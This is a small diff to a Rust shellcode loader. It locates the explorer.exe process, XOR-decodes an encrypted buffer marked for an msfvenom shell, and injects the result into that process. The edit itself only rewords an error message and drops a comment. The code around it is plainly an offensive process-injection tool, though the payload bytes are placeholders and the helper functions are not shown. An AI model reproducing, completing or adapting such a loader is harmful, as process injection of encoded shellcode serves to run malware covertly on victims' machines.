@@ -186,14 +186,14 @@ fn main() {
     let pid = match find_expl() {
         Some(pid) => pid,
         None => {
-            println!("Failed to find explorer.exe process");
+            println!("explorer dont exist");
             return;
         }
     };
 
     // msfvenom shell goes here vvv
     let encshell: [u8; 3] = [0xCC, 0xCC, 0xCC];
-    let key = 0xe2;  // Replace this with your actual key
+    let key = 0xe2;
 
     let decshell = xor_dec(&encshell, key);
     match inj_shell(pid, &decshell) {
